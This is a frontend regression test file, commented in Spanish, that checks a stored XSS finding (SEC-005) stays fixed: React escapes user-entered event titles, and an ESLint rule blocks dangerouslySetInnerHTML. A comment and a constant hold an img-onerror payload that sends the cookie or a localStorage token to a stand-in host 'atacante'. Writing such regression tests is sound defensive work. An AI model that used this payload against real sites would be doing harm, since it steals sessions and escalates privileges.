import { ESLint } from 'eslint'
import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

/**
 * SEC-005 — regresion.
 *
 * En v1 los campos que escribia el usuario se insertaban con `innerHTML` sin
 * escapar (`admin.js:95-103`, `cart.html:62-74`, `order.js:90-93`). Un
 * usuario sin privilegios creaba un evento titulado
 *
 *   <img src=x onerror="fetch('//atacante/?t='+localStorage.token)">
 *
 * y el script se ejecutaba en la sesion de la administradora al abrir el
 * panel. Cadena completa: usuario normal -> administrador.
 *
 * En v2 el hallazgo se cierra por construccion, y «por construccion» son dos
 * cosas distintas que conviene probar por separado.
 */
const PAYLOAD = '<img src=x onerror="fetch(\'//atacante/?t=\'+document.cookie)">'

describe('React escapa por defecto', () => {
  it('pinta el payload como texto y no como marcado', () => {
    const tituloDelEvento = PAYLOAD

    render(<p>{tituloDelEvento}</p>)

    // Se ve tal cual lo escribio el usuario...
    expect(screen.getByText(PAYLOAD)).toBeInTheDocument()
    // ...y no ha llegado a existir ninguna etiqueta.
    expect(document.querySelector('img')).toBeNull()
  })

  it('tampoco lo interpreta dentro de un atributo', () => {
    render(<p title={PAYLOAD}>Titulo del evento</p>)

    expect(screen.getByTitle(PAYLOAD)).toBeInTheDocument()
    expect(document.querySelector('img')).toBeNull()
  })
})

describe('la unica via de reintroducirlo esta bloqueada', () => {
  /**
   * Que la regla este escrita en eslint.config.js no prueba nada: hay que
   * comprobar que salta. Este test corre ESLint de verdad, con la
   * configuracion del proyecto, sobre el codigo que reintroduciria el fallo.
   */
  it('marca dangerouslySetInnerHTML como error de lint', async () => {
    const eslint = new ESLint()

    const [resultado] = await eslint.lintText(
      `export const Evento = ({ titulo }: { titulo: string }) =>\n` +
        `  <div dangerouslySetInnerHTML={{ __html: titulo }} />\n`,
      { filePath: 'src/features/backoffice/Evento.tsx' },
    )

    expect(resultado.messages.map((m) => m.ruleId)).toContain('react/no-danger')
    expect(resultado.errorCount).toBeGreaterThan(0)
  }, 30_000)

  it('no marca el mismo componente cuando pinta el titulo como texto', async () => {
    const eslint = new ESLint()

    const [resultado] = await eslint.lintText(
      `export const Evento = ({ titulo }: { titulo: string }) => <div>{titulo}</div>\n`,
      { filePath: 'src/features/backoffice/Evento.tsx' },
    )

    expect(resultado.errorCount).toBe(0)
  }, 30_000)
})
